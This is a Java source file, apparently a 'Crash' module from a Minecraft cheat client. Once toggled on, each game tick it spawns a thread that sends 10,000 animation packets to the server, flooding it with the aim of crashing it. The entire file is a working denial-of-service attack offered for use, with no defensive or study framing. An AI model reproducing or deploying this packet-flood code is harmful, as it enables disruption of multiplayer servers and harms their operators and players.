package me.rigamortis.faurax.module.modules.misc;

import me.rigamortis.faurax.module.*;
import me.rigamortis.faurax.events.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import com.darkmagician6.eventapi.*;

public class Crash extends Module
{
    public int delay;
    
    public Crash() {
        this.setKey("");
        this.setName("Crash");
        this.setType(ModuleType.MISC);
        this.setColor(-2836728);
        this.setModInfo("");
        this.setVisible(true);
    }
    
    @EventTarget
    public void preTick(final EventPreTick e) {
        if (this.isToggled()) {
            new Thread() {
                @Override
                public void run() {
                    for (int i = 0; i < 10000; ++i) {
                        Crash.mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
                    }
                }
            }.start();
        }
    }
}
